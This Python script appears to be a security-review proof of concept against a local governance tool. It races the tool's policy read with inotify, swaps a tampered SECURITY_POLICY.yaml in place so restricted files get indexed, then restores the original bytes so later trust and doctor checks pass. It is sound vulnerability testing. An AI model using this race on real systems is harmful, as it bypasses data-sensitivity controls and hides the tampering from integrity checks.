#!/usr/bin/env python3
"""R2b — use-time TOCTOU with restricted material that is inside the index scope (4.1.5 binary, scratch only).

A same-user process waits for kernel_trust to finish reading policies/SECURITY_POLICY.yaml (first IN_CLOSE_NOWRITE),
rewrites it in place without `restricted` in never_index_classes, and restores the original bytes when gov exits.
Persistent harm is measured afterwards by UNRACED processes: index rows, memory query, kernel trust, doctor.
"""
import ctypes, ctypes.util, json, os, sqlite3, subprocess, tempfile, threading, time
import yaml

REPO = "/home/usain/Dynamic-Agentic-Engineering-OS"
GOV = REPO + "/target/release/gov"
SP = os.path.dirname(os.path.abspath(__file__))
S = tempfile.mkdtemp(prefix="review-r2b-", dir=SP)
ENV = {k: v for k, v in os.environ.items() if k not in ("GOV_CANONICAL_ROOT", "GOV_ROLE", "GOV_SESSION", "GOV_KERNEL_SOURCE")}
ENV["GOV_KERNEL_CACHE"] = S + "/cache"
libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
IN_CLOSE_NOWRITE = 0x10


def gov(root, *args, popen=False):
    cmd = [GOV, "--json", "--root", root, "--session", "S-r2b", "--role", "orchestrator", *args]
    if popen:
        return subprocess.Popen(cmd, env=ENV, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    r = subprocess.run(cmd, env=ENV, capture_output=True, text=True)
    try:
        return json.loads(r.stdout)
    except Exception:
        return {"raw": r.stdout[-300:], "stderr": r.stderr[-300:]}


def git(root, *a):
    subprocess.run(["git", "-c", "user.name=r", "-c", "user.email=r@x", *a], cwd=root, check=True, capture_output=True)


CANDIDATES = {  # path -> marker
    "spec/decisions/D-9001.yaml": "RVSPECMARKER",
    "docs/restricted-note.md": "RVDOCSMARKER",
    "product/restricted-plan.md": "RVPRODUCTMARKER",
}


def hits(root, marker):
    q = gov(root, "memory", "query", marker)
    return [h.get("path") for h in ((q.get("result") or {}).get("hits") or []) if marker in json.dumps(h) or h.get("path") in CANDIDATES]


def index_rows(root):
    con = sqlite3.connect(root + "/.governance-runtime/state.db")
    arts = {r[0]: r[1] for r in con.execute("select path, sensitivity from artifacts") if r[0] in CANDIDATES}
    excl = {r[0]: r[1] for r in con.execute("select path, reason from excluded") if r[0] in CANDIDATES}
    return {"indexed": arts, "excluded": excl}


out = {"scratch": S}
root = S + "/consumer"
os.makedirs(root)
git(root, "init", "-q")
git(root, "commit", "-q", "--allow-empty", "-m", "init")
init = gov(root, "init", "--source", REPO + "/release/releases/4.1.5", "--name", "r2b", "--skip-index")
out["init_ok"] = init.get("ok")
for p, m in CANDIDATES.items():
    os.makedirs(os.path.dirname(f"{root}/{p}"), exist_ok=True)
    if p.endswith(".yaml"):
        yaml.safe_dump({"id": "D-9001", "type": "decision", "title": f"Customer pricing terms {m}", "status": "ACTIVE", "created": "2026-09-13",
                        "question": f"{m} proprietary pricing?", "chosen_option": "A", "rationale": f"{m} confidential", "state_class": "AUTHORITATIVE"},
                       open(f"{root}/{p}", "w"), sort_keys=False)
    else:
        open(f"{root}/{p}", "w").write(f"# Restricted\n\n{m} proprietary customer terms\n")
git(root, "add", "-A")
git(root, "commit", "-q", "-m", "material")

# 1. scope check: unclassified material is indexed and retrievable
gov(root, "rebuild-memory")
scope = {p: bool(hits(root, m)) for p, m in CANDIDATES.items()}
out["1_scope_unclassified_retrievable"] = scope
in_scope = [p for p, ok in scope.items() if ok]

# 2. classify in-scope material as restricted; control rebuild on the intact kernel
dsp = root + "/governance/project/DATA_SENSITIVITY.yaml"
ds = yaml.safe_load(open(dsp))
for p in in_scope:
    ds.setdefault("classifications", []).append({"pattern": p, "class": "restricted", "reason": "r2b"})
yaml.safe_dump(ds, open(dsp, "w"), sort_keys=False)
git(root, "add", "-A")
git(root, "commit", "-q", "-m", "classify restricted")
rb = gov(root, "rebuild-memory")
out["2_control_intact_kernel"] = {"rebuild_ok": rb.get("ok"), **index_rows(root), "retrievable": {p: hits(root, CANDIDATES[p]) for p in in_scope}}

# 3. raced full rebuild
policy = root + "/governance/kernel/policies/SECURITY_POLICY.yaml"
original = open(policy, "rb").read()
data = yaml.safe_load(original)


def strip(o):
    if isinstance(o, dict):
        for k, v in o.items():
            if k == "never_index_classes" and isinstance(v, list):
                o[k] = [x for x in v if x != "restricted"]
            else:
                strip(v)
    elif isinstance(o, list):
        for x in o:
            strip(x)


strip(data)
tampered = yaml.safe_dump(data, sort_keys=False).encode()


def racer(stop, log):
    fd = libc.inotify_init1(0)
    libc.inotify_add_watch(fd, policy.encode(), IN_CLOSE_NOWRITE)
    os.read(fd, 4096)
    t0 = time.monotonic()
    with open(policy, "r+b") as f:
        f.seek(0); f.write(tampered); f.truncate()
    log.append(f"swapped {1e3 * (time.monotonic() - t0):.2f} ms after kernel_trust's read")
    stop.wait()
    with open(policy, "r+b") as f:
        f.seek(0); f.write(original); f.truncate()
    log.append("original bytes restored after gov exited")
    os.close(fd)


trials = []
for i in range(5):
    stop, log = threading.Event(), []
    th = threading.Thread(target=racer, args=(stop, log), daemon=True)
    th.start(); time.sleep(0.2)
    p = gov(root, "rebuild-memory", popen=True)
    so, se = p.communicate()
    stop.set(); th.join(5)
    try:
        rbj = json.loads(so)
    except Exception:
        rbj = {"raw": so[-200:]}
    # everything below is an UNRACED process on the restored, byte-identical kernel
    trust = gov(root, "kernel", "trust")
    doc = gov(root, "doctor")
    checks = ((doc.get("result") or (doc.get("error") or {}).get("details") or {}).get("checks") or [])
    t = {"trial": i + 1, "race_log": log, "raced_rebuild_ok": rbj.get("ok"), **index_rows(root),
         "retrievable_unraced_query": {p: hits(root, CANDIDATES[p]) for p in in_scope},
         "policy_bytes_restored": open(policy, "rb").read() == original,
         "kernel_trust_verified": (trust.get("result") or {}).get("verified"),
         "doctor": {c["id"]: c["ok"] for c in checks if c.get("id") in ("D003", "D004", "D029")}}
    trials.append(t)
    if any(t["retrievable_unraced_query"].values()):
        break
out["3_raced_rebuild_trials"] = trials
print(json.dumps(out, indent=2))
